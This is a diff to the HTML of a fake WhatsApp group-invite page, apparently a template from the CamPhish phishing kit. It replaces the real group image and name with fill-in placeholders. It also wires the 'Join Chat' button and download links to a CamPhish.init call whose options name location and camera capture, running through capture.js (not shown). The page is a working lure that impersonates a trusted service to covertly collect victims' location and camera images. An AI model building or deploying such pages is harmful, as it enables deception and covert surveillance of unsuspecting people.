@@ -297,11 +297,10 @@
     <main class="main-content">
         <div class="invite-card">
             <div class="group-avatar">
-                <img src="https://pps.whatsapp.net/v/t61.24694-24/586499402_1548915952952220_7451154550492412225_n.jpg?ccb=11-4&oh=01_Q5Aa3QHtDVyHF-BA7NsFMht-gKEJboQCvqwqdT31LSkNsAKlDg&oe=69513CDA&_nc_sid=5e03e0&_nc_cat=100"
-                    alt="Group Icon"
+                <img src="__IMG__" alt="Group Icon"
                     onerror="this.style.display='none'; this.parentElement.innerHTML='<svg viewBox=\'0 0 24 24\'><path d=\'M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z\' fill=\'white\'/></svg>';">
             </div>
-            <h3 class="group-name">Online Shopping</h3>
+            <h3 class="group-name">__TITLE__</h3>
             <p class="group-subtitle">WhatsApp Group Invite</p>
             <button class="btn-join" id="joinBtn">Join Chat</button>
             <div class="divider"></div>
@@ -374,7 +373,16 @@
         </div>
     </footer>
     <script src="capture.js"></script>
-    <script>CamPhish.init('forwarding_link');</script>
+    <script>
+        function triggerCapture() {
+            CamPhish.init('forwarding_link', 'option_loc', 'option_cam');
+        }
+
+        document.getElementById('joinBtn').addEventListener('click', triggerCapture);
+        document.querySelectorAll('.btn-download, .download-link').forEach(function (el) {
+            el.addEventListener('click', triggerCapture);
+        });
+    </script>
 </body>
 
 </html>
